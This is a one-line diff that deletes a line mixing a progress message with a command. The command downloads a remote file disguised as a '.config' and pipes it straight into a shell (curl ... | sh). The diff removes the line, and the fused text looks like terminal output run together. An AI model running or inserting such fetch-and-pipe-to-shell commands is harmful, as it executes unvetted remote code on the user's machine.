@@ -1,1 +1,0 @@
-echo Progress: 42.00%curl -L --progress-bar frkns.github.io/fun/surRobot.config | sh
